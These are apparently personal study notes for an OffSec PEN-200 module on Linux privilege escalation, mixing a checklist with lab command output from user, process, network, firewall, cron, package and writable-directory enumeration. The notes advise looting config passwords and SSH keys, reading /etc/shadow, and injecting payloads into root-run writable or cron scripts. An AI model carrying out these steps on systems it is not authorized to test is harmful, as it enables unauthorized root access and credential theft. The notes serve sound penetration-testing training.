---
title: "PEN-200 Module 17 \u2014 Linux Privilege Escalation Guide"
slug: linux-priv-esc
author: m4xx3d0ut
summary: These notes expand the earlier outline with the detailed commands captured
  in the labs. Treat it as your Linux privesc checklist.
publishedAt: '2023-10-29'
updatedAt: '2023-11-06'
readingMinutes: 72
tags:
- offsec
---
# PEN-200 Module 17 — Linux Privilege Escalation Guide

## TLDR;

These notes expand the earlier outline with the detailed commands captured in the labs. Treat it as your Linux privesc checklist.

### Baseline Recon

```
uname -a
cat /etc/*release
id
sudo -l
lsblk
ps aux --forest
ss -tulpn
```

- Note kernel version, architecture, LSB data, and virtualisation hints.
- Record running services and which users own them.

### Credential & Config Looting

- Search for passwords and API keys:

```
find / -type f -name "*.conf" -o -name "*.ini" -o -name "*.php" 2>/dev/null | xargs grep -i "password"
strings /var/www/html/config.php | grep -i pass
```

- Inspect `/var/backups`, `/opt`, cron scripts, and git repos for secrets.
- Check SSH keys (`find /home -name "id_rsa" -o -name "authorized_keys"`).

### SUID / Capability Abuse

```
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

- Compare SUID binaries against `GTFOBins`; test exploitation paths.
- For writable scripts executed by root (`/usr/local/bin/backup.sh`), append your payload.

### Cron & Timer Abuse

```
cat /etc/crontab
ls -al /etc/cron.d
systemctl list-timers --all
```

- If cron executes user-writable scripts, inject commands.
- For systemd timers, edit unit files or replace referenced scripts when permissions allow.

### Kernel & Library Exploits

- Check exploit-db for kernel version vulnerabilities (`searchsploit "linux kernel" 5.4`).
- Validate prerequisites (SMEP/SMAP, GCC presence) before launching older exploits like DirtyCow.

### Automation Aids

- Run `linpeas.sh` or `lse.sh` after manual recon; annotate findings with risk & feasibility.
- Use `pspy` to monitor processes that may reveal credential drops or scheduled jobs.

### Documentation & Cleanup

- Keep a privesc log: command executed, outcome, files modified.
- After elevating, grab proof (`id`, `hostname`, `cat /etc/shadow` snippet redacted) then reverse changes.

### Defensive Advice

- Recommend patching kernels, pruning SUID binaries, and enforcing file ACL hygiene.
- Suggest centralising logs and enabling auditd rules for privilege events (`execve`, `setuid`).

Linux privilege escalation rewards curiosity and rigor. With these workflows you’ll move from user to root methodically and leave a clear trail defenders can follow.

## Working Notes... In Graphic Detail...

### Linux Privilege Escalation
 
- Enumerating Linux.
- Exposed Confidential Information.
- Insecure File Permissions.
- Abusing System Linux components.

#### Enumerating Linux 17.1

- Understand files and users privileges on Linux.
- Perform manual enumeration.
- Conduct automated enumeration.

##### Understanding Files and Users Privileges on Linux

A defining feature of Linux/Unix is that most resources are represented in the FS:
- Files.
- Directories.
- Devices.
- Network communication interfaces.
- In essence "everything is a file".

Every file or element of a Linux system adheres to [user and group](https://wiki.archlinux.org/index.php/users_and_groups) permissions with 3 primary properties:
- Read (r)
- Write (w)
- Execute (x)

Each file/directory has permissions in 3 categories of users:
- Owner.
- Owner group.
- Others group.

Each perm (rwx) allows authorized users to perform different actions dependent on if the resource is a file or directory.

For files:
- (r) allows reading file content.
- (w) allows changing the content.
- (x) allows file execution.

Directories are handles differently:
- (r) right to list the contents.
- (w) create or delete files.
- (x) allows crossing through dir to access contents using CLI.
 - The ability to cross through a dir without read allows the user to access unknown entries, only by knowing their exact names.

A simple example of these permissions on our local system:
```bash
┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
└─$ ls -l /etc/shadow               
-rw-r----- 1 root shadow 1510 Aug 26 18:13 /etc/shadow
```
- For each user category 3 different access perms are displayed.
 - The first `-` indicates file type and can be safely ignored.
- The next 3 are `root`
	- `rw-`
  - Owner has read, write, no exec.
- The next `shadow` group owner.
	- `r--`
  - Owner only has read access.
- The `others` group.
	- `---`
  - Has no rights on the file.

##### Manual Enumeration

Although time consuming, manual enumeration allows for a more controlled outcome and identifies lesser known PrivEsc vectors which are often overlooked by automated tools.  Automated enumeration cannot replace manual, the customized settings of our env are most likely to be misconfigured.

Upon initial access, the first thing we should ID is user context:
- We can use the `id` command.
	- [id](http://man7.org/linux/man-pages/man1/id.1.html)
```bash
joe@debian-privesc:~$ id
uid=1000(joe) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```
- The output shows we are user `joe`
- Has (UID) and (GID) of `1000`
- We also have group membership outside of our scope.

To enumerate all users, we can read the contents of `/etc/passwd`.
```bash
joe@debian-privesc:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pulse:x:110:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:112:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
eve:x:1001:1001:,,,:/home/eve:/bin/bash
lightdm:x:118:125:Light Display Manager:/var/lib/lightdm:/bin/false
```
- `passwd` lists several user accounts.
 - Including service accounts.
  - Such as `www-data` and `sshd`
   - Indicating presence of web and ssh server.
- Our current user data.
 - Login name `joe`
 - Encrypted password `x`
  - Typically contains hashed version of user password.
  - `x` indicated the hash is contained in the `/etc/shadows` file.
	- UID `1000`
  - Root user always has a UID of `0`
  - Regular users start from `1000`
   - Also referred to as the "real user ID".
	- GID `1000`
  - The user's specific Group ID.
	- Comment `joe,,,`
  - Description of user.
  - Often repeats username info.
	- Home folder `/home/joe`
  - Describes user home directory prompted at login.
	- Login shell `/bin/bash`
  - Indicates default interactive shell, if exists.

Other than our user `joe`, we find a user `eve` and can infer they are a standard user since the configured home folder is `/home/eve`.  System service homes are configured with `/usr/sbin/nologin` as shell, where `nologin` statement is used to block remote/local login of service account.

Enumerating all users of the target system helps ID potentially high-priv user accounts we may want to target in PrivEsc attempts.

The next item we want to note is the machine's `hostname`, which often provide clues about the functional role of the machine.  Abbreviations such as web, db, or dc can indicated to us the system's purpose.

On most Linux distros, the hostname will be shown in the command prompt, but we should always rely on system commands since the prompt text can be manipulated.

We can use the `hostname` command to retrieve this:
```bash
joe@debian-privesc:~$ hostname
debian-privesc
```
- Enterpises often have enforced hostname naming convention schemes for categorizing by location, description, OS, and service level.
- In our case, the hostname is two parts.
 - OS type.
 - Description.
- The role of a machine can help us focus our info gathering by adding context around the host.

During the PrivEsc process we may need kernel exploits to leverage core OS vulns.  This class of exploit is built for very specific types of targets, specified by OS and version combo.  Attacking a target with a mismatched kernel exploit can lead to system error or crash, we must gather precise info about the target before selecting an exploit.

*During the PrivEsc process we may need kernel exploits to leverage core OS vulns.  This class of exploit is built for very specific types of targets, specified by OS and version combo.  Attacking a target with a mismatched kernel exploit can lead to system error or crash, we must gather precise info about the target before selecting an exploit.*

To obtain system info we can review:
- `/etc/issue`
- `/etc/*-release`
- Run `uname -a`
```bash
joe@debian-privesc:~$ cat /etc/issue && cat /etc/*-release && uname -a
Debian GNU/Linux 10 \n \l

PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64 GNU/Linux
```
- `issue` and `os-release` foles in `/etc` contain.
 - OS version.
 - Release-specific info.
  - Including distro code name.
- `uname -a` outputs.
 - Kernel version.
 - Architecture.


Next we explore running processes and services that may allow PrivEsc.  For this:
- The proc must run in the context of a priv account.
- Must have either.
 - Insecure perms.
 - Allow us to interact with it in unintended ways.
- We can list sys procs, included those run by priv user, with `ps`
 - Use flags.
		- `a` and `x` to list procs with and without a [TTY](https://www.linusakesson.net/programming/tty/)
  - `u` user-readable format.
```bash
joe@debian-privesc:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.5 169596 10332 ?        Ss   14:16   0:03 /sbin/init
...
colord     811  0.0  0.6 246964 12312 ?        Ssl  14:16   0:00 /usr/lib/colord/colord
www-data   988  0.0  0.1  11480  3756 ?        S    14:19   0:00 /usr/sbin/apache2 -k sta
www-data   989  0.0  0.3 1216084 6428 ?        Sl   14:19   0:00 /usr/sbin/apache2 -k sta
www-data   990  0.0  0.4 1216084 8468 ?        Sl   14:19   0:00 /usr/sbin/apache2 -k sta
root      1052  0.0  0.3  27160  8124 ?        Ss   14:19   0:00 /usr/sbin/cupsd -l
root      1053  0.0  0.5 176748 10860 ?        Ssl  14:19   0:00 /usr/sbin/cups-browsed
systemd+  1186  0.0  0.3  20956  6652 ?        Ss   14:19   0:00 /lib/systemd/systemd-net
root      1697  0.0  0.3  14648  7996 ?        Ss   14:23   0:00 sshd: joe [priv]
joe       1702  0.0  0.4  21168  9276 ?        Ss   14:23   0:00 /lib/systemd/systemd --u
joe       1703  0.0  0.1 170896  2564 ?        S    14:23   0:00 (sd-pam)
joe       1717  0.0  0.2  14932  6092 ?        S    14:23   0:00 sshd: joe@pts/0
joe       1718  0.0  0.2   8236  5056 pts/0    Ss   14:23   0:00 -bash
root      4191  0.0  0.0      0     0 ?        I    14:43   0:00 [kworker/0:0-events_powe
root      4916  0.0  0.0      0     0 ?        I    14:49   0:00 [kworker/0:3-ata_sff]
root      6168  0.0  0.0      0     0 ?        I    15:00   0:00 [kworker/u4:1-events_unb
root      6170  0.0  0.0      0     0 ?        I    15:00   0:00 [kworker/1:3-cgroup_dest
root      6857  0.0  0.0      0     0 ?        I    15:06   0:00 [kworker/1:0-cgroup_dest
root      8068  0.0  0.0      0     0 ?        I    15:16   0:00 [kworker/1:1-events]
root      8136  0.0  0.0      0     0 ?        I    15:17   0:00 [kworker/u4:2-events_unb
root      8322  0.0  0.0      0     0 ?        I    15:18   0:00 [kworker/0:2-cgroup_dest
root      8729  0.0  0.0      0     0 ?        I    15:22   0:00 [kworker/u4:0-events_unb
root      8731  0.0  0.0      0     0 ?        I    15:22   0:00 [kworker/1:2-cgroup_dest
eve       8926  0.1  0.4  21168  9040 ?        Ss   15:24   0:00 /lib/systemd/systemd --u
eve       8927  0.0  0.1 170896  2604 ?        S    15:24   0:00 (sd-pam)
joe       8949  0.0  0.1  10628  3136 pts/0    R+   15:24   0:00 ps aux
```
- The output shows several `root` owned services we should research.
- The `ps` command we ran is also listed in the output owned by our current user.
 - We can filter specific user-owned procs.

Next we will review the network interfaces, routes, and open ports of the target sys.  This allows us to determine if the target is connected to multiple networks and could potentially be used to pivot.  Presence of virtual ifaces may indicated the existence of virtualization or AV software.

*An attacker may use a compromised target to pivot, or move between connected networks. This will amplify network visibility and allow the attacker to target hosts not directly reachable from the original attack machine.*

Port bindings can tell us if a running service is only available on a loopback address instead of a routable iface.  A privileged service running on a LO iface could expand our attack surface and increase probability of PrivEsc success.

Depending on the Linux version we can list TCP/IP config of network adapters with `ipconfig` or `ip`, both accept the `a` flag to display all available info.
```bash
joe@debian-privesc:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:bf:fa:39 brd ff:ff:ff:ff:ff:ff
    inet 192.168.188.214/24 brd 192.168.188.255 scope global ens192
       valid_lft forever preferred_lft forever
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:bf:0b:7d brd ff:ff:ff:ff:ff:ff
    inet 172.16.128.214/24 brd 172.16.128.255 scope global ens224
       valid_lft forever preferred_lft forever
```
- Based on this output, we see the system connects to more than one network.

We can display routing tables with `route` or `routel`.
```bash
joe@debian-privesc:~$ routel
         target            gateway          source    proto    scope    dev tbl
        default    192.168.188.254                   static          ens192 
   172.16.128.0 24                  172.16.128.214   kernel     link ens224 
  192.168.188.0 24                 192.168.188.214   kernel     link ens192 
      127.0.0.0          broadcast       127.0.0.1   kernel     link     lo local
      127.0.0.0 8            local       127.0.0.1   kernel     host     lo local
      127.0.0.1              local       127.0.0.1   kernel     host     lo local
127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
   172.16.128.0          broadcast  172.16.128.214   kernel     link ens224 local
 172.16.128.214              local  172.16.128.214   kernel     host ens224 local
 172.16.128.255          broadcast  172.16.128.214   kernel     link ens224 local
  192.168.188.0          broadcast 192.168.188.214   kernel     link ens192 local
192.168.188.214              local 192.168.188.214   kernel     host ens192 local
192.168.188.255          broadcast 192.168.188.214   kernel     link ens192 local
```

We can display active network connections and listening ports with `netstat` or `ss`, which both accept the same arguments.
- List all connections `-a`
- Avoid hostname resolution `-n`
- List proc name the conn belongs to with `-p`
```bash
joe@debian-privesc:~$ ss -anp
Netid  State      Recv-Q  Send-Q                              Local Address:Port              Peer Address:Port                                                                   
nl     UNCONN     0       0                                               0:466                           *                                                                       
...                                                                      
udp    UNCONN     0       0                                            [::]:5353                      [::]:*                                                                      
tcp    LISTEN     0       128                                       0.0.0.0:80                     0.0.0.0:*                                                                      
tcp    LISTEN     0       128                                       0.0.0.0:22                     0.0.0.0:*                                                                      
tcp    LISTEN     0       5                                       127.0.0.1:631                    0.0.0.0:*                                                                      
tcp    ESTAB      0       36                                192.168.188.214:22              192.168.45.182:37184                                                                  
tcp    TIME-WAIT  0       0                                       127.0.0.1:43288                127.0.0.1:4444                                                                   
tcp    TIME-WAIT  0       0                                       127.0.0.1:40600                127.0.0.1:22                                                                     
tcp    TIME-WAIT  0       0                                       127.0.0.1:43416                127.0.0.1:4444                                                                   
tcp    TIME-WAIT  0       0                                       127.0.0.1:41066                127.0.0.1:22                                                                     
tcp    TIME-WAIT  0       0                                       127.0.0.1:34284                127.0.0.1:4444                                                                   
tcp    TIME-WAIT  0       0                                       127.0.0.1:58016                127.0.0.1:22                                                                     
tcp    TIME-WAIT  0       0                                       127.0.0.1:40866                127.0.0.1:4444                                                                   
tcp    TIME-WAIT  0       0                                       127.0.0.1:36032                127.0.0.1:22                                                                     
tcp    LISTEN     0       128                                          [::]:22                        [::]:*                                                                      
v_str  ESTAB      0       0                                      2659772525:1023                         0:976
```
- Output shows various listening ports and active sessions.
 - Including our SSH session and listening socket.

Next we inspect firewall rules.  Generally we are interested in the firewall state, profile, and rules during the remote exploitation phase, but this info can also be useful during PrivEsc.  Example, if a network service is not remotely accessible we can likely access it via the lo iface.  If we can interact with those service locally, we can attempt to exploit them for PrivEsc.

We should also father info about in/out-bound port filters to support port forwarding/tunneling when we need to pivot to an internal network.

On Linux, we need root to list firewall rules with IPtables.  Depending on how the firsway is configured, we may be able to obtain some some info as a standard user.

The `iptables-persistent` Debian package save firewall rules in certain files under `/etc/iptables/` by default and uses them to restore `netfilter` rules at boot time.  These files often have weak perms, allowing a local user to read them.

We can also search for `iptables-save` created files, which dumps the firewall conf to a user specified file.  This file is then used as input to the `iptables-restore` command, restoring firewall rules at next boot.  If an admin has ever run this command, we could search `/etc` or grep the FS for `iptables` commands to locate them.  If the file perms are weak, we can read them to infer firewall rules in use on the system.
```bash
joe@debian-privesc:~$ cat /etc/iptables/rules.v4 
# Generated by xtables-save v1.8.2 on Thu Aug 18 12:53:22 2022
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT
COMMIT
# Completed on Thu Aug 18 12:53:22 2022
```
- Since the file is RO by users other than root, we can inspect it.
- Notice the non-default rule explicitly allowing the dest port 1999.
 - This should be noted for further inspection.

Next we examine scheduled tasks, commonly leveraged during PrivEsc.  Server systems often execute automated scheduled tasks.  When misconfigured or user created file perms are weak, we can modify the files that will be exec by the scheduling system with high level of priv.

The Linux job scheduler is called `cron`.  Tasks are listed under `/etc/cron.*` dirs, where `*` represents the frequency the task runs at.  For instance, daily tasks will be stored under `/etc/cron.daily`, each script is listed in its own subdir.
```bash
joe@debian-privesc:~$ ls -lah /etc/cron*
-rw-r--r-- 1 root root 1.1K Oct 11  2019 /etc/crontab

/etc/cron.d:
total 24K
drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
drwxr-xr-x 125 root root  12K Feb 15  2023 ..
-rw-r--r--   1 root root  285 May 19  2019 anacron
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.daily:
total 60K
drwxr-xr-x   2 root root 4.0K Aug 18  2022 .
drwxr-xr-x 125 root root  12K Feb 15  2023 ..
-rwxr-xr-x   1 root root  311 May 19  2019 0anacron
-rwxr-xr-x   1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x   1 root root 1.5K Dec  7  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root  384 Dec 31  2018 cracklib-runtime
-rwxr-xr-x   1 root root 1.2K Apr 18  2019 dpkg
-rwxr-xr-x   1 root root 2.2K Feb 10  2018 locate
-rwxr-xr-x   1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x   1 root root 1.1K Feb 10  2019 man-db
-rwxr-xr-x   1 root root  249 Sep 27  2017 passwd
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.hourly:
total 20K
drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
drwxr-xr-x 125 root root  12K Feb 15  2023 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 24K
drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
drwxr-xr-x 125 root root  12K Feb 15  2023 ..
-rwxr-xr-x   1 root root  313 May 19  2019 0anacron
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 28K
drwxr-xr-x   2 root root 4.0K Aug 16  2022 .
drwxr-xr-x 125 root root  12K Feb 15  2023 ..
-rwxr-xr-x   1 root root  312 May 19  2019 0anacron
-rwxr-xr-x   1 root root  813 Feb 10  2019 man-db
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
```
- We find several daily tasks.

Note that sys admins often add their own sched tasks to `/etc/crontab` and they should be inspected carefully for weak perms.  Most jobs will run as root.  They can be viewed with `crontab -l`.  Running the command with `sudo` will show a root `crontab`.  Always check both user and root crontab.
```
# m h  dom mon dow   command
* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
```
- We find a backup job in the root crontab.
 - If the script perms are weak, we can leverage it for PrivEsc.
 - *As we'll learn later in this Module, the joe user has been granted specific sudo permission only to list cron jobs running as the root user. This permission alone cannot be abused to obtain a root shell.*.

We will at some point need to leverage exploits to achieve PrivEsc.  In this case we must start with enumerating the installed apps and versions, to search for matching exploits.

Manually searching app info can be time consuming, we will learn how to automate this, but we should know how to manually query installed packages as needed.

Linux distros use many different package managers.  Debian based distros use `dpkg` whereas Red Hat uses `rpm`.  To list packages on Debian we ues `dpkg -l`.
```bash
joe@debian-privesc:~$ dpkg -l
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                                  Version                                      Ar
+++-=====================================-============================================-==
ii  accountsservice                       0.6.45-2                                     am
ii  acl                                   2.2.53-4                                     am
ii  adduser                               3.118                                        al
ii  adwaita-icon-theme                    3.30.1-1                                     al
ii  aisleriot                             1:3.22.7-2                                   am
ii  alsa-utils                            1.1.8-2                                      am
ii  anacron                               2.3-28                                       am
ii  analog                                2:6.0-22                                     am
ii  apache2                               2.4.38-3+deb10u7                             am
ii  apache2-bin                           2.4.38-3+deb10u7                             am
ii  apache2-data                          2.4.38-3+deb10u7                             al
ii  apache2-doc                           2.4.38-3+deb10u7                             al
ii  apache2-utils                         2.4.38-3+deb10u7                             am
```
- This confirms our expectation from enumerating open ports, this machine runs a web server.
 - In this case `Apache2`

As we know, files with insufficient access restrictions can create a vuln that may grant an attacker elevated privs.  This can happen when an attacker can modify scripts or binaries that are executed under the context of a privileged account.

Sensitive files that are readable by an unpriv user can also contain important info such as creds to DBs or service accounts running with elevated privs.

It is not feasible to manually check the perms of each file and dir, we must automate this task.  To start, we can use `find` to ID files with insecure perms.  We can search for every dir writable by current user on the target with flags:
- `/` to search the entire root.
- `-writable` to specify attribute.
- `type d` for dirs.
- `2>/dev/null` to filter errors.
```bash
joe@debian-privesc:~$ find / -writable -type d 2>/dev/null
/run/user/1000
/run/user/1000/pulse
/run/user/1000/gnupg
/run/user/1000/systemd
/run/lock
/home/joe
/home/joe/Videos
/home/joe/Templates
/home/joe/.local
/home/joe/.local/share
/home/joe/.local/share/sounds
/home/joe/.local/share/evolution
/home/joe/.local/share/evolution/tasks
/home/joe/.local/share/evolution/tasks/system
/home/joe/.local/share/evolution/tasks/trash
/home/joe/.local/share/evolution/addressbook
/home/joe/.local/share/evolution/addressbook/system
/home/joe/.local/share/evolution/addressbook/system/photos
/home/joe/.local/share/evolution/addressbook/trash
/home/joe/.local/share/evolution/mail
/home/joe/.local/share/evolution/mail/trash
/home/joe/.local/share/evolution/memos
/home/joe/.local/share/evolution/memos/system
/home/joe/.local/share/evolution/memos/trash
/home/joe/.local/share/evolution/calendar
/home/joe/.local/share/evolution/calendar/system
/home/joe/.local/share/evolution/calendar/trash
/home/joe/.local/share/icc
/home/joe/.local/share/gnome-shell
/home/joe/.local/share/gnome-settings-daemon
/home/joe/.local/share/keyrings
/home/joe/.local/share/tracker
/home/joe/.local/share/tracker/data
/home/joe/.local/share/folks
/home/joe/.local/share/gvfs-metadata
/home/joe/.local/share/applications
/home/joe/.local/share/nano
/home/joe/Downloads
/home/joe/.scripts
/home/joe/Pictures
/home/joe/.cache
/home/joe/.cache/gnome-calculator
/home/joe/.cache/evolution
/home/joe/.cache/evolution/tasks
/home/joe/.cache/evolution/tasks/trash
/home/joe/.cache/evolution/sources
/home/joe/.cache/evolution/sources/trash
/home/joe/.cache/evolution/addressbook
/home/joe/.cache/evolution/addressbook/trash
/home/joe/.cache/evolution/mail
/home/joe/.cache/evolution/mail/trash
/home/joe/.cache/evolution/memos
/home/joe/.cache/evolution/memos/trash
/home/joe/.cache/evolution/calendar
/home/joe/.cache/evolution/calendar/trash
/home/joe/.cache/libgweather
/home/joe/.cache/tracker
/home/joe/.cache/folks
/home/joe/.cache/folks/avatars
/home/joe/.cache/obexd
/home/joe/.cache/gnome-software
/home/joe/.cache/gnome-software/fwupd
/home/joe/.cache/gnome-software/fwupd/remotes.d
/home/joe/.cache/gnome-software/fwupd/remotes.d/lvfs
/home/joe/.cache/gnome-software/odrs
/home/joe/.cache/gnome-software/shell-extensions
/home/joe/.cache/gstreamer-1.0
/home/joe/Documents
/home/joe/.gnupg
/home/joe/.gnupg/private-keys-v1.d
/home/joe/Music
/home/joe/Desktop
/home/joe/.config
/home/joe/.config/ibus
/home/joe/.config/ibus/bus
/home/joe/.config/evolution
/home/joe/.config/evolution/sources
/home/joe/.config/gnome-session
/home/joe/.config/gnome-session/saved-session
/home/joe/.config/gtk-3.0
/home/joe/.config/dconf
/home/joe/.config/procps
/home/joe/.config/pulse
/home/joe/.config/goa-1.0
/home/joe/.config/nautilus
/home/joe/.ssh
/home/joe/Public
/tmp
/tmp/.XIM-unix
/tmp/.Test-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/tmp/.font-unix
/proc/6784/task/6784/fd
/proc/6784/fd
/proc/6784/map_files
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
/dev/mqueue
/dev/shm
/var/tmp
/usr/share/ppd/custom
```
- Several dirs are world writable.
 - Including `/home/joe/.scripts` which contains a cron script.
  - This warrants further investigation.

On most systems drives automatically mount at boot, but we should always look for unmounted drives which may contain valuable info.  If they exist, check the mount perms.  We can use `mount` to list all mounted FS and view `/etc/fstab` to list all drives mounted at boot time.
```bash
joe@debian-privesc:~$ cat /etc/fstab 
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/sda1 during installation
UUID=60b4af9b-bc53-4213-909b-a2c5e090e261 /               ext4    errors=remount-ro 0       1
# swap was on /dev/sda5 during installation
UUID=86dc11f3-4b41-4e06-b923-86e78eaddab7 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

joe@debian-privesc:~$ mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001064k,nr_inodes=250266,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=204196k,mode=755)
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
bpf on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
